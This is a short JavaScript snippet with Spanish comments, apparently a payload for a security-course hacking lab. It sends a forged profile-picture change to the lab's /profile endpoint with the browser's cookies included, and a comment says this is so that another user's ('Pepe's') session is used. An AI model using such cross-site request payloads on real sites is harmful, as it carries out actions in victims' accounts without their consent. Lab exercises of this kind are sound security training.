// Crear un formulario para enviar la imagen de perfil
var form = new FormData();
form.append("bio", "None");  // Aquí puedes cambiar la biografía si quieres

// Aquí va la cadena de bytes que corresponde a la cabecera del PNG que enviaste
// Este es solo un ejemplo, si tienes el archivo completo, asegúrate de usarlo.
var pngData = new Uint8Array([
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // Cabecera PNG
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC5, 0x2A
    // Añadir más bytes del archivo PNG aquí (puedes reemplazar con el contenido exacto)
]);

// Crear el Blob con los bytes del PNG
var blob = new Blob([pngData], { type: "image/png" });

// Incluir la imagen en el formulario
form.append("profile_pic", blob, "foto.png");

// Realizar el envío a la ruta "/profile" para cambiar la imagen de perfil
fetch("https://chl-e2bb87ff-6372-4f7b-be4d-662e3c3303ae-blog-hacklab.softwareseguro.com.ar/profile", {
  method: "POST",
  credentials: "include",  // Incluir las cookies para que la sesión de Pepe se utilice
  body: form
}).then(response => {
  if (response.ok) {
    console.log("Foto de perfil cambiada con éxito.");
  } else {
    console.log("Error al cambiar la foto de perfil.");
  }
});

